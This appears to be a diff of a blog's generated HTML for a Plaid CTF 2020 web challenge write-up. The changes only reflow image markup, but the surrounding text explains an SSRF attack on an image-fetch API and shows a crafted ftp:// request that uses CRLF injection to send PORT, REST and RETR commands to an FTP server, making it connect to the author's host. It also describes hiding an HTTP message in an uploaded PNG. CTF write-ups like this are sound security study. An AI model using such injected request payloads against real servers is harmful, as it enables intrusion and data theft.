@@ -80,8 +80,7 @@ CTF
 <pre tabindex=0><code>GET /api/image?url=ftp://2:2%250d%250aPORT%20172,32,56,72,61,56%250d%250aREST%206%250d%250aRETR%20%252fuser%252fb21791e2-6016-4c36-8f9a-6054750d2b5a%252fprofile%252epng@ftp:21/user/b21791e2-6016-4c36-8f9a-6054750d2b5a/profile.png 
 </code></pre><p>This url will make a request like this.</p>
 <p><figure class=gallery-image style=flex-grow:107;flex-basis:257px>
-<a href=/2020/04/20/Plaid-CTF-2020-Web-1/1.png data-size=1136x1060>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/1.png width=1136 height=1060 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/1_hu2534235a6890b2653b295e7674384fb3_214938_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/1_hu2534235a6890b2653b295e7674384fb3_214938_1024x0_resize_box_3.png 1024w" loading=lazy>
+<a href=/2020/04/20/Plaid-CTF-2020-Web-1/1.png data-size=1136x1060><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/1.png width=1136 height=1060 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/1_hu2534235a6890b2653b295e7674384fb3_214938_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/1_hu2534235a6890b2653b295e7674384fb3_214938_1024x0_resize_box_3.png 1024w" loading=lazy>
 </a>
 </figure></p>
 <p>So we get a CRLF now.</p>
@@ -94,16 +93,14 @@ CTF
 </blockquote>
 <p>If we don&rsquo;t inject code through CRLF, we can get the FTP traffic like this:</p>
 <p><figure class=gallery-image style=flex-grow:133;flex-basis:319px>
-<a href=/2020/04/20/Plaid-CTF-2020-Web-1/2.png data-size=1044x784>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/2.png width=1044 height=784 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/2_hu3dd3d8b5d9c777b8314f165c28777b6c_132757_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/2_hu3dd3d8b5d9c777b8314f165c28777b6c_132757_1024x0_resize_box_3.png 1024w" loading=lazy>
+<a href=/2020/04/20/Plaid-CTF-2020-Web-1/2.png data-size=1044x784><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/2.png width=1044 height=784 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/2_hu3dd3d8b5d9c777b8314f165c28777b6c_132757_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/2_hu3dd3d8b5d9c777b8314f165c28777b6c_132757_1024x0_resize_box_3.png 1024w" loading=lazy>
 </a>
 </figure></p>
 <p>So it will use <code>PASV</code> command to open passive mode and build a connection with client.</p>
 <p>Why not inject <code>PORT</code> commant through CRLF to let ftp-srv open active mode and let ftp-srv connect with my server?</p>
 <p>Yeah. Just like this. I use <code>PORT</code> command to let ftp-srv connect with my server.</p>
 <p><figure class=gallery-image style=flex-grow:107;flex-basis:257px>
-<a href=/2020/04/20/Plaid-CTF-2020-Web-1/1.png data-size=1136x1060>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/1.png width=1136 height=1060 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/1_hu2534235a6890b2653b295e7674384fb3_214938_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/1_hu2534235a6890b2653b295e7674384fb3_214938_1024x0_resize_box_3.png 1024w" loading=lazy>
+<a href=/2020/04/20/Plaid-CTF-2020-Web-1/1.png data-size=1136x1060><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/1.png width=1136 height=1060 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/1_hu2534235a6890b2653b295e7674384fb3_214938_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/1_hu2534235a6890b2653b295e7674384fb3_214938_1024x0_resize_box_3.png 1024w" loading=lazy>
 </a>
 </figure></p>
 <p>But if you try with <code>LIST</code> or something else following by <code>PORT</code> command, you can&rsquo;t get the response on your server. It&rsquo;s a bit strange that I still confused about it. If you know something about this, welcome to discuss.</p>
@@ -169,8 +166,7 @@ CTF
 <p>But how?</p>
 <p>We notice that we can hide a http message in the profile png and use <code>RRETR</code> to let the ftp server return the message of png.</p>
 <p><figure class=gallery-image style=flex-grow:216;flex-basis:519px>
-<a href=/2020/04/20/Plaid-CTF-2020-Web-1/3.png data-size=2144x990>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/3.png width=2144 height=990 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/3_hue603c68732ff32e978ee0f6fbd652b43_310903_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/3_hue603c68732ff32e978ee0f6fbd652b43_310903_1024x0_resize_box_3.png 1024w" loading=lazy>
+<a href=/2020/04/20/Plaid-CTF-2020-Web-1/3.png data-size=2144x990><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/3.png width=2144 height=990 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/3_hue603c68732ff32e978ee0f6fbd652b43_310903_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/3_hue603c68732ff32e978ee0f6fbd652b43_310903_1024x0_resize_box_3.png 1024w" loading=lazy>
 </a>
 </figure></p>
 <p>And use <code>REST 6</code> to cut the message, make the response like a http message. This is similar with http response splitting.</p>
@@ -188,14 +184,12 @@ CTF
 <p>{% twitter <a class=link href=https://twitter.com/zwad3/status/1252087190278082562 target=_blank rel=noopener>https://twitter.com/zwad3/status/1252087190278082562</a> %}</p>
 <p>He mentioned we should send the real request followed by 50,000 dumb requests (in one file). I tried this method today and this really gave 100% success rate.</p>
 <p><figure class=gallery-image style=flex-grow:216;flex-basis:519px>
-<a href=/2020/04/20/Plaid-CTF-2020-Web-1/3.png data-size=2144x990>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/3.png width=2144 height=990 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/3_hue603c68732ff32e978ee0f6fbd652b43_310903_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/3_hue603c68732ff32e978ee0f6fbd652b43_310903_1024x0_resize_box_3.png 1024w" loading=lazy>
+<a href=/2020/04/20/Plaid-CTF-2020-Web-1/3.png data-size=2144x990><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/3.png width=2144 height=990 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/3_hue603c68732ff32e978ee0f6fbd652b43_310903_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/3_hue603c68732ff32e978ee0f6fbd652b43_310903_1024x0_resize_box_3.png 1024w" loading=lazy>
 </a>
 </figure></p>
 <p>Just like this, I put 1000 http get requests in one file and every time can get flag.</p>
 <p><figure class=gallery-image style=flex-grow:171;flex-basis:410px>
-<a href=/2020/04/20/Plaid-CTF-2020-Web-1/4.png data-size=832x486>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/4.png width=832 height=486 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/4_huf9bca2348c75ea9ea9f86c51daef134d_46888_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/4_huf9bca2348c75ea9ea9f86c51daef134d_46888_1024x0_resize_box_3.png 1024w" loading=lazy>
+<a href=/2020/04/20/Plaid-CTF-2020-Web-1/4.png data-size=832x486><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2020/04/20/Plaid-CTF-2020-Web-1/4.png width=832 height=486 srcset="/2020/04/20/Plaid-CTF-2020-Web-1/4_huf9bca2348c75ea9ea9f86c51daef134d_46888_480x0_resize_box_3.png 480w, /2020/04/20/Plaid-CTF-2020-Web-1/4_huf9bca2348c75ea9ea9f86c51daef134d_46888_1024x0_resize_box_3.png 1024w" loading=lazy>
 </a>
 </figure></p>
 <p>Interesting challange! Hope u enjoy!</p>
